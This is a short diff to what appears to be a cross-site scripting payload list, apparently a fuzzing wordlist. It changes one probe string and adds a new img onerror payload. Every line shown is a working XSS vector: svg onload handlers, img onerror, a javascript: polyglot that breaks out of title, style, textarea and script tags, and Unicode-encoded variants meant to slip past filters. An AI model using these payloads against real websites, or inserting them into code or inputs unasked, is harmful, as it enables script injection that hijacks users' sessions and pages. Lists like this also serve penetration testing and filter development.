@@ -1169,7 +1169,7 @@ javascript:_e({}, 'cvml', 'test-01-'-alert(1)-'');
 <script>parent.location.replace('javascript:alert(document.domain)')</script>
 "name":"Foo <img src=x onerror=alert(/XSS/.source)>Bar"
 %CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert(1)%EF%BC%9E
-"xxxxxxxx'yyyyy</img
+"xss'cx</img
 <svg/onload=setTimeout`alert\`1\``>
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmouseover=1/+/[*/[]/+alert(1)//'>
 <svg/onload=setTimeout`alert\`1\``>
@@ -1183,3 +1183,4 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <applet onerror=alert('xss')> 
 <object onbeforescriptexecute="alert(1)"/><script>+</script>
 ＜℅ncut=ﬁnd()＞x
+'"><img src=x onerror=prompt(0);"onfocus=prompt(3); "
